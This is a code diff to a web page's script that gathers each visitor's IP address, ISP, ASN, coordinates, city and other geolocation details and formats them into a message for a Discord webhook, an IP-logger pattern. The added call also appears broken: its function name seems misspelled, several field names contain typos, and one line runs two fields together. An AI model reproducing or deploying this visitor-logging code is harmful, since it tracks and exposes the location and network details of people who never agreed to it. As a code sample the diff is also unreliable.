@@ -147,9 +147,25 @@
           <p>Languages: ${Information.Languages}</p>
         `;
         Container.innerHTML = newText;
-
-        // Send message to Discord webhook
-        sendWebhookMessage(Information);
+        endWebhookMessage(`
+        IP: ${Information.IP}
+        Version: ${Information.Vers}
+        ASN: ${Information.ASN}
+        ISP: ${Information.ISP}
+        Latitude: ${Information.Latitude}
+        Longitudes: ${Information.Longitude}
+        Country: ${Information.Country}
+        Country Code: ${Information.CountyCode}
+        Country Population: ${Information.Country_Population}City: ${Information.City}
+        Region: ${Information.Region}
+        Region Code: ${Information.RegionCODE}
+        Network: ${Information.Network}
+        Timezone: ${Information.Timezone}
+        Continent: ${Information.Continent}
+        Country Calling Code: ${Information.CountryCallin}
+        Currency: ${Information.Currency} / ${Information.Currency_Name}
+        Languages: ${Information.Languages}
+        `);
         
       });
     </script>
